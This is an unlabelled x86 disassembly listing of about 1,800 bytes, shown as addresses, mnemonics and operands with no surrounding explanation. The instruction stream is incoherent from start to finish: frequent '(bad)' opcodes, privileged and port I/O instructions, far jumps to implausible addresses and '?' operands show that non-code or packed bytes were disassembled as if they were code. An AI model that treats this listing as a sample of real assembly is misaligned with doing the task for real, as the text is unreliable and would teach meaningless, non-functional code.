  40510d:	aaa    
  40510e:	inc    esi
  40510f:	daa    
  405110:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405111:	or     esi,esp
  405113:	cmp    ch,BYTE PTR [esi-0x3]
  405116:	xchg   BYTE PTR [ebp+ebx*4-0x2a],al
  40511a:	out    0x66,eax
  40511c:	test   eax,0xfd433e3f
  405121:	adc    esi,DWORD PTR ds:0x314d78fa
  405127:	jle    0x4050c3
  405129:	push   ss
  40512a:	dec    esi
  40512b:	in     al,dx
  40512c:	jl     0x405139
  40512e:	adc    eax,0x47f716c0
  405133:	clc    
  405134:	cmc    
  405135:	push   edi
  405136:	add    DWORD PTR [eax],edx
  405138:	cwde   
  405139:	mov    ebp,0xf6150b7a
  40513e:	pop    ds
  40513f:	imul   edi,esp,0xa6572c7d
  405145:	jge    0x40511b
  405147:	dec    ecx
  405148:	fld    TBYTE PTR [ecx-0x6a]
  40514b:	mov    esi,0xc200efc5
  405150:	or     ch,BYTE PTR [di+0x54]
  405154:	mov    edi,edx
  405156:	sub    BYTE PTR [ebx+0x1c64a36f],bl
  40515c:	int3   
  40515d:	sbb    ecx,esp
  40515f:	jmp    0x405192
  405161:	jae    0x405156
  405163:	fistp  WORD PTR [edi+0x5dcccd8e]
  405169:	or     al,0x20
  40516b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40516c:	rol    DWORD PTR [eax+0x24],0x1f
  405170:	push   es
  405171:	add    bh,dl
  405173:	mov    edx,0xbf7bda17
  405178:	jle    0x405180
  40517a:	dec    eax
  40517b:	fs sbb eax,0xc7d43dc3
  405181:	std    
  405182:	xchg   esi,eax
  405183:	iret   
  405184:	sub    dh,BYTE PTR [eax-0x25]
  405187:	lods   al,BYTE PTR ds:[esi]
  405188:	fld    TBYTE PTR [ecx]
  40518a:	loopne 0x40514e
  40518c:	xlat   BYTE PTR ds:[ebx]
  40518d:	add    DWORD PTR [eax+0x4e],eax
  405190:	and    eax,0xb67f687b
  405195:	dec    eax
  405196:	xchg   edi,eax
  405197:	je     0x405160
  405199:	imul   edx,ebp,0x4121be64
  40519f:	or     BYTE PTR [ecx],dh
  4051a1:	pop    eax
  4051a2:	hlt    
  4051a3:	mov    DWORD PTR [ecx],0x9fd4ed92
  4051a9:	push   ebx
  4051aa:	jge    0x4051ac
  4051ac:	rcr    ah,0x43
  4051af:	in     eax,dx
  4051b0:	xchg   esp,eax
  4051b1:	scas   al,BYTE PTR es:[edi]
  4051b2:	inc    edi
  4051b3:	call   0xed5cc5a
  4051b8:	adc    eax,0x9fcfb4ab
  4051bd:	scas   eax,DWORD PTR es:[edi]
  4051be:	push   es
  4051bf:	fdiv   st,st(6)
  4051c1:	xor    DWORD PTR [eax],0xf1118a5a
  4051c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4051c8:	add    eax,0x745e08
  4051cd:	or     dl,ch
  4051cf:	repz popa 
  4051d1:	inc    esi
  4051d2:	mov    ah,0xc5
  4051d4:	mov    WORD PTR [edx-0x75],gs
  4051d7:	lods   eax,DWORD PTR ds:[esi]
  4051d8:	(bad)  
  4051d9:	lahf   
  4051da:	out    0x9,al
  4051dc:	repz leave 
  4051de:	dec    esi
  4051df:	xchg   edx,eax
  4051e0:	and    DWORD PTR [esi-0x33f1040],0x85e3f266
  4051ea:	push   ebp
  4051eb:	out    0x9d,eax
  4051ed:	sub    DWORD PTR [edi+0x54b77356],edx
  4051f3:	popf   
  4051f4:	add    al,0xb9
  4051f6:	xchg   ecx,eax
  4051f7:	xor    dl,ch
  4051f9:	dec    ebx
  4051fa:	inc    ebp
  4051fb:	stc    
  4051fc:	dec    ebp
  4051fd:	pop    edi
  4051fe:	sub    eax,0x78076b4a
  405203:	jo     0x4051b8
  405205:	jns    0x4051c1
  405207:	sub    al,0xde
  405209:	dec    ecx
  40520a:	jmp    FWORD PTR [ecx]
  40520c:	push   ebx
  40520d:	mov    al,ds:0x624f21f
  405212:	rol    DWORD PTR [ebx],cl
  405214:	or     BYTE PTR [esi],ch
  405216:	loope  0x4051ed
  405218:	push   DWORD PTR [ebp-0x1d]
  40521b:	pop    ebp
  40521c:	xchg   esp,eax
  40521d:	shr    BYTE PTR [ebx],cl
  40521f:	jecxz  0x4051c4
  405221:	dec    esi
  405222:	mov    edi,0x2703c000
  405227:	jle    0x4051fb
  405229:	mov    eax,0xce7e66ef
  40522e:	sub    eax,0x35dafdfc
  405233:	add    edx,esp
  405235:	in     eax,0x24
  405237:	jmp    0x4f531803
  40523c:	repnz sub DWORD PTR [edx-0x76686d4b],edi
  405243:	stc    
  405244:	mov    dh,0xba
  405246:	sahf   
  405247:	cmp    ah,cl
  405249:	sub    al,0xbf
  40524b:	xchg   esp,eax
  40524c:	call   0x227fa3f3
  405251:	ins    DWORD PTR es:[edi],dx
  405252:	mov    WORD PTR [ecx],?
  405254:	or     BYTE PTR [esi+ecx*4-0x57ffb6a],ch
  40525b:	jns    0x40524f
  40525d:	div    cl
  40525f:	mov    cl,0x8b
  405261:	and    dl,BYTE PTR ds:0x139aa2ba
  405267:	data16 cli 
  405269:	add    dh,BYTE PTR [edi+0x40a4d23]
  40526f:	int3   
  405270:	stos   DWORD PTR es:[edi],eax
  405271:	sbb    DWORD PTR [eax],eax
  405273:	test   BYTE PTR [ecx-0x2ef7fa00],ch
  405279:	outs   dx,BYTE PTR ds:[esi]
  40527a:	mov    ds:0xcefecc0a,eax
  40527f:	stos   DWORD PTR es:[edi],eax
  405280:	test   al,0xf0
  405282:	lea    eax,[ebx+0x74]
  405285:	ret    
  405286:	test   eax,0x4af28a76
  40528b:	call   0xce3d:0xf9c47be7
  405292:	out    dx,eax
  405293:	sar    DWORD PTR [eax-0x63],1
  405296:	push   cs
  405297:	in     al,0x23
  405299:	sub    al,0xa2
  40529b:	sub    edx,eax
  40529d:	mov    dh,dl
  40529f:	mov    cl,0xa
  4052a1:	jg     0x405271
  4052a3:	repnz cmp ebp,esi
  4052a6:	sti    
  4052a7:	push   ds
  4052a8:	pop    edi
  4052a9:	test   eax,0xedd28052
  4052ae:	cld    
  4052af:	cmp    ecx,ecx
  4052b1:	lahf   
  4052b2:	pop    ds
  4052b3:	loope  0x4052ac
  4052b5:	popf   
  4052b6:	cld    
  4052b7:	fld    QWORD PTR [esi]
  4052b9:	or     eax,0x920c9392
  4052be:	in     ax,0x37
  4052c1:	loop   0x405302
  4052c3:	cli    
  4052c4:	push   DWORD PTR [esi]
  4052c6:	jle    0x4052a5
  4052c8:	int    0xaf
  4052ca:	xchg   ebp,eax
  4052cb:	out    dx,al
  4052cc:	add    ch,cl
  4052ce:	jp     0x4052e3
  4052d0:	or     al,0x80
  4052d2:	cs and eax,0xf9ca369c
  4052d8:	xor    eax,0xbe75d7b9
  4052dd:	inc    edi
  4052de:	and    DWORD PTR [ebx],0x9
  4052e1:	cli    
  4052e2:	test   DWORD PTR cs:[ebp+0x6f],0x4f8cb777
  4052ea:	sahf   
  4052eb:	jp     0x4052b5
  4052ed:	idiv   DWORD PTR [edx+edi*4-0x7b]
  4052f1:	mov    edi,0xbecfd61b
  4052f6:	popa   
  4052f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4052f8:	lea    esp,[esi+0x63]
  4052fb:	sbb    eax,0x2b2859d4
  405300:	adc    BYTE PTR [eax-0x7a],ah
  405303:	mov    WORD PTR [bx+si],ss
  405306:	mov    DWORD PTR [ecx+0x3f79dbaa],ebp
  40530c:	test   DWORD PTR [ebx+0x1],ecx
  40530f:	mov    eax,ebp
  405311:	adc    BYTE PTR [ecx+ebx*8-0x72e581e6],al
  405318:	mov    DWORD PTR [edi],ebp
  40531a:	cmp    al,BYTE PTR [eax]
  40531c:	add    al,0xfd
  40531e:	shl    DWORD PTR [esi+0x4236d9d5],1
  405324:	add    eax,0xf91673bf
  405329:	ins    BYTE PTR es:[edi],dx
  40532a:	push   es
  40532b:	lock cmp DWORD PTR [edx+0x32],0xffffffbf
  405330:	pop    DWORD PTR [ecx]
  405332:	ror    BYTE PTR [ecx],0x8c
  405335:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405336:	cmp    eax,0xf65787f1
  40533b:	rcl    DWORD PTR ds:0xd83a29d9,1
  405341:	pop    ss
  405342:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405343:	iret   
  405344:	lods   al,BYTE PTR ds:[esi]
  405345:	sbb    DWORD PTR [esi+0x308285d3],esp
  40534b:	aas    
  40534c:	push   0x7d1254ba
  405351:	jae    0x405305
  405353:	pop    eax
  405354:	and    DWORD PTR [edi-0x5aa1bcce],esi
  40535a:	dec    ebp
  40535b:	cwde   
  40535c:	popa   
  40535d:	cmp    ebp,DWORD PTR [edi-0x3e622f36]
  405363:	clc    
  405364:	xchg   BYTE PTR [esi+0x2c],ch
  405367:	hlt    
  405368:	ror    DWORD PTR [ecx-0x59],1
  40536b:	xchg   ecx,eax
  40536d:	mov    ds:0x65e638d6,eax
  405372:	xor    al,dl
  405374:	nop
  405375:	mov    eax,0x1201c03d
  40537a:	shr    BYTE PTR [eax-0x247aed31],0x47
  405381:	jecxz  0x4053e1
  405383:	sbb    edi,DWORD PTR [ebp-0x512d5226]
  405389:	retf   0x6d34
  40538c:	mov    al,0x46
  40538e:	loop   0x40531d
  405390:	test   DWORD PTR [esi],ebp
  405392:	data16 cli 
  405394:	cmp    bh,BYTE PTR [edi]
  405396:	inc    ebx
  405397:	aaa    
  405398:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405399:	cmp    bl,bl
  40539b:	push   0x8f48ae6d
  4053a0:	xor    DWORD PTR [eax],ecx
  4053a2:	mov    ebx,?
  4053a4:	cmp    eax,0x8ea2fc71
  4053a9:	cmp    BYTE PTR [ebp-0x121d8a66],bh
  4053af:	stc    
  4053b0:	adc    ah,BYTE PTR ds:0xa0ffcaf9
  4053b6:	add    DWORD PTR [eax],eax
  4053b8:	das    
  4053b9:	ret    
  4053ba:	cld    
  4053bb:	out    0x15,al
  4053bd:	ss or  ebx,esp
  4053c0:	and    DWORD PTR [edx+0x40],edx
  4053c3:	retf   0x7d7a
  4053c6:	fmul   DWORD PTR [eax+0x2]
  4053c9:	mov    esp,0xd325bed2
  4053ce:	sub    edi,esp
  4053d0:	cmp    ecx,0xf3650521
  4053d6:	xchg   ecx,eax
  4053d7:	inc    esi
  4053d8:	pop    ds
  4053d9:	(bad)  
  4053da:	xor    eax,0x20330c30
  4053df:	mov    al,ds:0x75780e5f
  4053e4:	push   ecx
  4053e5:	or     eax,0x9123252e
  4053ea:	clc    
  4053eb:	sub    al,0xbd
  4053ed:	sub    BYTE PTR [ebx],bl
  4053ef:	add    ebp,esi
  4053f1:	icebp  
  4053f2:	test   al,0xbe
  4053f4:	(bad)  
  4053f5:	aad    0x58
  4053f7:	popf   
  4053f8:	mov    ecx,0xb40100fd
  4053fd:	xor    DWORD PTR [ebx+0x6a],ecx
  405400:	test   DWORD PTR [edi],esi
  405402:	hlt    
  405403:	ja     0x405430
  405405:	push   es
  405406:	jmp    0x9a7f4a9c
  40540b:	repnz dec esi
  40540d:	adc    bh,BYTE PTR [edi]
  40540f:	xor    dl,ch
  405411:	push   edx
  405412:	std    
  405413:	jb     0x4053d1
  405415:	scas   eax,DWORD PTR es:[edi]
  405416:	mov    ebx,0x3993ca97
  40541b:	jb     0x405435
  40541d:	adc    BYTE PTR [esi+0xa021307],al
  405423:	aad    0xf1
  405425:	cmp    al,0x1d
  405427:	loop   0x405424
  405429:	lods   al,BYTE PTR ds:[esi]
  40542a:	and    DWORD PTR [esi-0x67],edx
  40542d:	mov    eax,0x78f9bbef
  405432:	xlat   BYTE PTR ds:[ebx]
  405433:	cdq    
  405434:	xor    edx,edi
  405436:	push   eax
  405437:	ins    DWORD PTR es:[edi],dx
  405438:	push   edx
  405439:	in     al,dx
  40543a:	push   es
  40543b:	jge    0x40544e
  40543d:	dec    eax
  40543e:	and    al,0xaa
  405440:	int    0x5e
  405442:	mov    esi,0xf35ae46
  405447:	jbe    0x40549c
  405449:	mov    eax,0x2a50c02d
  40544e:	in     al,0x78
  405450:	sub    edi,ebx
  405452:	ret    0x1b4f
  405455:	adc    BYTE PTR [eax+ebp*2-0x7ae9f000],bh
  40545c:	push   ss
  40545d:	out    0x82,al
  40545f:	or     dh,BYTE PTR [ebx+0x47]
  405462:	mov    ch,0xf2
  405464:	jecxz  0x405401
  405466:	add    esp,0xbe69abe7
  40546c:	cs cli 
  40546e:	inc    edi
  40546f:	xchg   esi,eax
  405470:	mov    eax,0x6c01b41e
  405475:	popa   
  405476:	out    0xda,al
  405478:	ss jmp 0x40544e
  40547b:	xor    eax,0xb4d2d6eb
  405480:	lahf   
  405481:	xchg   ebx,eax
  405482:	out    dx,eax
  405483:	mov    dh,0xe
  405485:	lods   al,BYTE PTR ds:[esi]
  405486:	mov    ds:0xe5a713c3,al
  40548b:	cld    
  40548c:	jbe    0x4054ec
  40548e:	ins    DWORD PTR es:[edi],dx
  40548f:	mov    al,ds:0x92886c16
  405494:	mov    BYTE PTR [edi+0x76af5fa0],dh
  40549a:	rcl    BYTE PTR [esi-0x5d5842d7],cl
  4054a0:	ss enter 0x6efd,0xa7
  4054a5:	inc    ebx
  4054a6:	sbb    DWORD PTR [edi],edx
  4054a8:	jmp    0x405508
  4054aa:	sbb    ebp,DWORD PTR [ebp-0x52ae5118]
  4054b0:	aam    0x46
  4054b2:	jecxz  0x4054b0
  4054b4:	cmc    
  4054b5:	mov    ah,0x57
  4054b7:	in     al,0x55
  4054b9:	(bad)  
  4054ba:	daa    
  4054bb:	(bad)  
  4054bc:	jne    0x40546a
  4054be:	xchg   ebp,eax
  4054bf:	lds    edx,FWORD PTR [ecx+0x37717c89]
  4054c5:	sub    eax,DWORD PTR [edi]
  4054c7:	sar    DWORD PTR [ecx-0x46],cl
  4054ca:	jns    0x40552e
  4054cc:	mov    dh,0x61
  4054ce:	pop    es
  4054cf:	js     0x4054f8
  4054d1:	add    eax,eax
  4054d3:	xor    al,0x33
  4054d5:	cli    
  4054d6:	dec    eax
  4054d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4054d8:	pop    edx
  4054d9:	icebp  
  4054da:	shr    ebp,cl
  4054dc:	gs mov al,al
  4054df:	add    BYTE PTR [esi],dl
  4054e1:	push   ecx
  4054e2:	jbe    0x40546b
  4054e4:	sbb    bl,bh
  4054e6:	jbe    0x40546c
  4054e8:	(bad)  
  4054e9:	daa    
  4054ea:	sbb    DWORD PTR [esi+edi*2-0x1d],edi
  4054ee:	int3   
  4054ef:	cmp    ch,bl
  4054f1:	cmp    DWORD PTR [esi],edi
  4054f3:	pop    ds
  4054f4:	add    BYTE PTR [eax+edx*1-0x38],ch
  4054f8:	das    
  4054f9:	ror    DWORD PTR [ebx],0x10
  4054fc:	add    al,0x81
  4054fe:	adc    ebp,ebx
  405500:	jg     0x405562
  405502:	nop
  405503:	ja     0x405575
  405505:	pop    ds
  405506:	(bad)  
  405507:	fiadd  WORD PTR [eax-0x69]
  40550a:	xor    BYTE PTR [eax-0x3b],bh
  40550d:	push   edi
  40550e:	iret   
  40550f:	outs   dx,BYTE PTR ds:[esi]
  405510:	and    al,0x82
  405512:	mov    WORD PTR [edi+0x70000d40],gs
  405518:	add    BYTE PTR [ecx+0x3a7b91c1],0x94
  40551f:	out    0x95,al
  405521:	js     0x40555e
  405523:	imul   DWORD PTR [ecx+0x46]
  405526:	aas    
  405527:	jmp    0x339db442
  40552c:	mov    ds:0xdf45b0db,eax
  405531:	addr16 daa 
  405533:	int    0x89
  405535:	fsubr  QWORD PTR [esi]
  405537:	add    edx,0xffffff89
  40553a:	lods   al,BYTE PTR ds:[esi]
  40553b:	add    cl,BYTE PTR [esi-0x4]
  40553e:	jmp    0x3b94:0xaf810661
  405545:	sbb    ebp,DWORD PTR [edx+0x53]
  405548:	pop    ds
  405549:	xor    esi,edi
  40554b:	test   dh,ch
  40554d:	sti    
  40554e:	sbb    BYTE PTR [ebx+0x72000664],ch
  405554:	test   DWORD PTR [ecx+edi*2],edi
  405557:	mov    WORD PTR ds:[ecx+0xa362dd],cs
  40555e:	xchg   ebp,eax
  40555f:	arpl   WORD PTR [ecx+0x3a],si
  405562:	lds    ebp,FWORD PTR [ebx]
  405564:	jmp    FWORD PTR [edx-0x6a]
  405567:	add    BYTE PTR [eax-0x47],al
  40556a:	ret    0xda69
  40556d:	push   ecx
  40556e:	(bad)  
  40556f:	rcl    ch,cl
  405571:	fcom   QWORD PTR [edi+0x0]
  405574:	call   0xb4f:0x2700a4bd
  40557b:	ins    DWORD PTR es:[edi],dx
  40557c:	es inc ecx
  40557e:	jno    0x40557e
  405580:	jp     0x405600
  405582:	sbb    eax,0xa41d7e0
  405587:	addr16 clc 
  405589:	xor    BYTE PTR [ebx-0x2146cade],ah
  40558f:	dec    ebx
  405590:	sub    eax,0x145e0be
  405595:	adc    BYTE PTR [esi+0x41],0x28
  405599:	int    0xdc
  40559b:	jno    0x4055de
  40559d:	xchg   edi,eax
  40559e:	adc    al,0x59
  4055a0:	out    0xc5,eax
  4055a2:	cmc    
  4055a3:	fbstp  TBYTE PTR [eax]
  4055a5:	push   es
  4055a6:	mov    eax,ds:0xd4847f3
  4055ab:	out    dx,al
  4055ac:	loope  0x4055e6
  4055ae:	jmp    0x405537
  4055b0:	xchg   ebp,eax
  4055b1:	dec    esi
  4055b2:	cli    
  4055b3:	stc    
  4055b4:	out    dx,al
  4055b5:	or     bl,BYTE PTR [ebp+0x51e95529]
  4055bb:	rol    ebx,1
  4055bd:	out    0xc8,eax
  4055bf:	pop    esp
  4055c0:	xlat   BYTE PTR ds:[ebx]
  4055c1:	pushf  
  4055c2:	(bad)  
  4055c3:	iret   
  4055c4:	out    dx,eax
  4055c5:	(bad)  
  4055c6:	out    0xcd,al
  4055c8:	lock test bl,bl
  4055cb:	mov    cl,BYTE PTR [ecx+0x61d074e4]
  4055d1:	(bad)  
  4055d2:	call   DWORD PTR [ecx]
  4055d4:	xor    DWORD PTR [edi+0x310e1fe7],ebx
  4055da:	inc    ebx
  4055db:	div    BYTE PTR [ebx]
  4055dd:	arpl   WORD PTR [ebx+0x4],ax
  4055e0:	(bad)  
  4055e1:	in     al,0xbd
  4055e3:	pushf  
  4055e4:	(bad)  
  4055e5:	outs   dx,DWORD PTR ds:[esi]
  4055e6:	cmc    
  4055e7:	out    0x40,eax
  4055e9:	out    0xf3,al
  4055eb:	rol    bl,1
  4055ed:	jns    0x4055c1
  4055ef:	aas    
  4055f0:	jmp    0x22b9:0x5e1db180
  4055f7:	fcomp  QWORD PTR [esi-0x656186ee]
  4055fd:	push   es
  4055fe:	and    ch,BYTE PTR [ecx-0x5c]
  405601:	adc    al,dl
  405603:	enter  0xe9a0,0x12
  405607:	(bad)  
  405608:	das    
  405609:	rcl    DWORD PTR [eax-0x53],1
  40560c:	popf   
  40560d:	mov    ?,eax
  40560f:	or     bh,bh
  405611:	adc    cl,0x97
  405614:	pop    ecx
  405615:	call   FWORD PTR [edi-0x51728b4]
  40561b:	push   esp
  40561c:	lahf   
  40561d:	mov    ah,0xf7
  40561f:	cmp    al,0x96
  405621:	ds sahf 
  405623:	sub    DWORD PTR [esi-0x56],esi
  405626:	scas   eax,DWORD PTR es:[edi]
  405627:	mov    edx,0xa4eb55f9
  40562c:	fmul   QWORD PTR [edi+eiz*1-0x6678f64a]
  405633:	loop   0x40566b
  405635:	out    dx,eax
  405636:	adc    al,0xfd
  405638:	or     esi,DWORD PTR [edi+0x4d341309]
  40563e:	mov    eax,DWORD PTR [ebx]
  405640:	add    BYTE PTR [eax],ch
  405642:	push   0x50ea3007
  405647:	lock mov ch,0x45
  40564a:	imul   edi
  40564c:	push   es
  40564d:	lods   eax,DWORD PTR ds:[esi]
  40564e:	out    0x7c,al
  405650:	imul   esp,ebx,0x52733d00
  405656:	test   eax,0x3f728f44
  40565b:	pop    ebp
  40565c:	jmp    0xe1808dd7
  405661:	jb     0x405661
  405663:	mov    ebx,0xbe93b063
  405668:	push   ecx
  405669:	in     eax,dx
  40566a:	popa   
  40566b:	or     edi,eax
  40566d:	xchg   ebx,eax
  40566e:	xchg   ebp,eax
  40566f:	pop    ebx
  405670:	cli    
  405671:	(bad)  
  405673:	xlat   BYTE PTR ds:[ebx]
  405674:	mul    edi
  405676:	sbb    ah,al
  405678:	pop    esp
  405679:	sti    
  40567a:	push   es
  40567b:	fstp   QWORD PTR [esi]
  40567d:	js     0x4056b5
  40567f:	mov    al,ds:0x77c89f9f
  405684:	jb     0x405685
  405686:	cli    
  405687:	and    dl,BYTE PTR [ecx]
  405689:	loopne 0x4056e2
  40568b:	mov    bh,0xf1
  40568d:	(bad)  
  40568e:	repz cld 
  405690:	sub    edi,esp
  405692:	scas   al,BYTE PTR es:[edi]
  405693:	retf   
  405694:	pop    ebp
  405695:	inc    ebx
  405696:	pop    ebp
  405697:	mov    cl,0x28
  405699:	lea    ecx,[ebp+0x286c4e7]
  40569f:	out    0xc6,al
  4056a1:	xchg   DWORD PTR [bx-0x3c4f],esp
  4056a6:	arpl   WORD PTR [ebx-0x180e7102],ax
  4056ac:	jmp    0x405650
  4056ae:	ds std 
  4056b0:	out    dx,eax
  4056b1:	pop    esi
  4056b2:	xchg   esi,eax
  4056b3:	mov    ecx,DWORD PTR [edx+0xa]
  4056b6:	add    BYTE PTR [eax],al
  4056b8:	add    al,0x86
  4056ba:	faddp  st(2),st
  4056bc:	jge    0x405733
  4056be:	sub    DWORD PTR [eax-0xad8c068],eax
  4056c4:	xor    DWORD PTR [eax+0x1a2fbb1e],ebp
  4056ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4056cb:	int    0x49
  4056cd:	xchg   esi,eax
  4056ce:	mov    dh,0x1e
  4056d0:	cmp    ah,BYTE PTR [edi+eax*8]
  4056d3:	in     al,dx
  4056d4:	jns    0x405658
  4056d6:	stc    
  4056d7:	popa   
  4056d8:	in     al,dx
  4056d9:	or     al,dh
  4056db:	call   0x58b04e48
  4056e0:	sbb    al,0x46
  4056e2:	cwde   
  4056e3:	inc    esp
  4056e4:	icebp  
  4056e5:	push   edx
  4056e6:	mov    ah,0xf
  4056e8:	mov    esp,0x161000e0
  4056ed:	test   dl,dl
  4056ef:	retf   0x8d0f
  4056f2:	pop    ss
  4056f3:	or     bl,BYTE PTR es:[eax]
  4056f6:	adc    al,0xfa
  4056f8:	sbb    bh,BYTE PTR [edx]
  4056fa:	icebp  
  4056fb:	std    
  4056fc:	fimul  DWORD PTR [eax]
  4056fe:	hlt    
  4056ff:	jo     0x4056bb
  405701:	(bad)  
  405702:	mov    al,0x7a
  405704:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405705:	stc    
  405706:	or     dl,al
  405708:	cmp    DWORD PTR [ecx],esi
  40570a:	or     ecx,esp
  40570c:	into   
  40570d:	add    esi,DWORD PTR [edx-0xe229e11]
  405713:	push   eax
  405714:	mov    ds:0x2ed72e8d,al
  405719:	mov    dl,0x6a
  40571b:	jbe    0x40577f
  40571d:	sahf   
  40571e:	outs   dx,DWORD PTR ds:[esi]
  40571f:	fld    DWORD PTR [esi]
  405721:	sub    BYTE PTR [ebp-0x39e1af5c],0xa7
  405728:	sub    al,0xf
  40572a:	ror    BYTE PTR [esi-0x1231a388],1
  405730:	loop   0x4056c5
  405732:	push   esi
  405733:	repz jmp 0x2043:0x5c9e313
  40573b:	test   al,0xc2
  40573d:	inc    eax
  40573e:	mov    dl,0x39
  405740:	fimul  WORD PTR [ecx-0x65]
  405743:	repz mov bl,0xf4
  405746:	retf   
  405747:	fadd   QWORD PTR [ebp-0x68c62677]
  40574d:	fsubr  QWORD PTR [edi-0x396ffb50]
  405753:	xor    eax,0x788e4819
  405758:	xor    ecx,DWORD PTR [edx+ebx*1]
  40575b:	or     al,0x8
  40575d:	cwde   
  40575e:	je     0x4057dc
  405760:	in     al,dx
  405761:	cs jle 0x4057e1
  405764:	mov    ch,BYTE PTR [edi+0x514dd077]
  40576a:	addr16 mov ebp,es
  40576d:	aam    0x5a
  40576f:	mov    ss,WORD PTR [edx]
  405771:	add    eax,0xcdafa2b5
  405776:	dec    ebp
  405777:	rol    BYTE PTR [edi+0x28f02bb5],1
  40577d:	scas   eax,DWORD PTR es:[edi]
  40577e:	out    0x9f,al
  405780:	pop    ecx
  405781:	cmp    DWORD PTR [eax+0x4f],eax
  405784:	into   
  405785:	(bad)  
  405786:	in     al,0x79
  405788:	pop    ebp
  405789:	sahf   
  40578a:	fsubr  st(4),st
  40578c:	inc    edi
  40578d:	add    al,0x54
  40578f:	add    BYTE PTR [eax],ch
  405791:	mov    dl,0xca
  405793:	ret    0xc036
  405796:	jg     0x405747
  405798:	jmp    0x5a3ffc87
  40579d:	cmp    BYTE PTR [ecx-0x45],al
  4057a0:	jns    0x405787
  4057a2:	dec    esp
  4057a3:	adc    eax,DWORD PTR [ebp+0x45f901aa]
  4057a9:	mov    ds:0xb031ed01,al
  4057ae:	ins    DWORD PTR es:[edi],dx
  4057af:	and    bh,al
  4057b1:	mov    esp,0x3e7d51dd
  4057b6:	in     al,dx
  4057b7:	sub    edx,DWORD PTR [eax]
  4057b9:	fsub   st,st(3)
  4057bb:	mov    dh,0xd3
  4057bd:	mov    edi,0xefc9f5f5
  4057c2:	mov    esi,0xec426a7b
  4057c7:	sub    dl,BYTE PTR [edi+0x33]
  4057ca:	test   al,0xe5
  4057cc:	mov    ebp,0xb4040159
  4057d1:	jmp    0x692be5a0
  4057d6:	out    dx,eax
  4057d7:	leave  
  4057d8:	xor    DWORD PTR [esi-0x5d],ebp
  4057db:	xlat   BYTE PTR ds:[ebx]
  4057dc:	adc    BYTE PTR [ecx+0x5eb5bfa5],ah
  4057e2:	out    0x6b,al
  4057e4:	and    al,al
  4057e6:	ja     0x405857
  4057e8:	jbe    0x40577e
  4057ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4057eb:	mov    cl,0x21
  4057ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4057ee:	push   eax
  4057ef:	hlt    
  4057f0:	jnp    0x40582f
  4057f2:	stos   DWORD PTR es:[edi],eax
  4057f3:	push   0x91a45b26
  4057f8:	fcom   QWORD PTR [edx+ebx*1+0x8635243]
  4057ff:	retf   0x7f70
  405802:	push   esp
  405803:	mov    ecx,0x8be93c2f
  405808:	push   ds
  405809:	sbb    ah,ah
  40580b:	arpl   WORD PTR [edi-0xe490588],ax
  405811:	js     0x4057f3
  405813:	mov    esi,0x9c5fbe59
  405818:	and    DWORD PTR [edx],edi
  40581a:	leave  
  40581b:	jg     0x4057dc
  40581d:	mov    edx,0x4b1e9db7
  405822:	or     al,0x8a
  405824:	in     eax,dx
  405825:	loopne 0x40587f
  405827:	mov    cl,0x26
  405829:	and    BYTE PTR ds:0xf2cf5820,cl
  40582f:	fcom   st(5)
  405831:	cdq    
  405832:	pop    esp
  405833:	ret    
  405834:	rol    DWORD PTR [eax-0x46c4199],cl
  40583a:	cli    
  40583b:	mov    edx,0x58e51764
  405840:	mov    ch,BYTE PTR [ecx+0x4b64b3f3]
  405846:	sub    al,0x79
  405848:	imul   esp,DWORD PTR [eax],0x7d5b0d00
  40584e:	xchg   BYTE PTR [esi],dh
  405850:	sbb    edi,ebp
  405852:	les    ecx,FWORD PTR [ecx]
  405854:	or     dh,BYTE PTR [edi]
  405856:	mov    esp,0x4bc18186
  40585b:	adc    eax,0x505e08
  405860:	or     BYTE PTR [esi+0x6f8c61fc],ch
  405866:	mov    al,es:0xf46bb0e9
  40586c:	outs   dx,DWORD PTR ds:[esi]
  40586d:	ins    DWORD PTR es:[edi],dx
  40586e:	add    al,0x6
  405870:	ins    DWORD PTR es:[edi],dx
  405871:	shr    BYTE PTR [esi],1
  405873:	lahf   
  405874:	pop    ebx
  405875:	jno    0x4058d4
  405877:	data16 hlt 
  405879:	ds sahf 
  40587b:	and    al,0x98
  40587d:	and    BYTE PTR ds:0x1d1dd366,al
  405883:	mov    bl,0x74
  405885:	pusha  
  405886:	mov    edx,0xc431ab20
  40588b:	ret    0xa1e1
  40588e:	ds dec edx
  405890:	lea    ebx,[ebp-0x1d3525f]
  405896:	lods   al,BYTE PTR gs:[esi]
  405898:	neg    al
  40589a:	sub    al,BYTE PTR [eax]
  40589c:	or     al,0x79
  40589e:	mov    edi,0x68b2e9d9
  4058a3:	enter  0xf077,0x1d
  4058a7:	dec    edx
  4058a8:	repnz pop ss
  4058aa:	cmp    edx,ebp
  4058ac:	mov    eax,ds:0x57954e35
  4058b1:	or     dl,ch
  4058b3:	inc    ebp
  4058b4:	pop    ecx
  4058b5:	das    
  4058b6:	inc    edi
  4058b7:	dec    ecx
  4058b8:	pop    esi
  4058b9:	jns    0x4058fb
  4058bb:	push   ecx
  4058bc:	pop    edi
  4058bd:	xchg   esi,eax
  4058be:	outs   dx,DWORD PTR ds:[esi]
  4058bf:	mov    edx,0x74db5f91
  4058c4:	cmp    al,0x0
  4058c6:	inc    eax
  4058c7:	add    BYTE PTR [esi-0x40],al
  4058ca:	dec    ebp
  4058cb:	test   eax,0x8d476e01
  4058d0:	push   edi
  4058d1:	mov    ds:0x35636a36,eax
  4058d6:	loopne 0x405871
  4058d8:	dec    ecx
  4058d9:	lahf   
  4058da:	push   edi
  4058db:	sbb    eax,0xd2d26e8f
  4058e0:	ret    0xdcc5
  4058e3:	out    dx,al
  4058e4:	push   esp
  4058e5:	or     cl,BYTE PTR [esp+edx*1+0x63]
  4058e9:	leave  
  4058ea:	bound  eax,QWORD PTR [edx+0x43d9dd5e]
  4058f0:	sbb    eax,0xd69f000c
